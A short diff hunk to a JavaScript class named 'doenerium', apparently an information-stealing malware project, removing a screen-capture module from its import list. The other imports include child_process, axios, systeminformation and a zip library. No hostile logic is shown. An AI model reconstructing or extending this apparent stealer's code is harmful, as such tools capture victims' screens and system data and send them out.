@@ -104,7 +104,6 @@ class doenerium {
       os: require("os"),
       axios: require("axios"),
       child_process: require("child_process"),
-      screenshot: require("screenshot-desktop"),
       systeminformation: require("systeminformation"),
       buf_replace: require("buffer-replace"),
       jszip: require("zip-lib"),
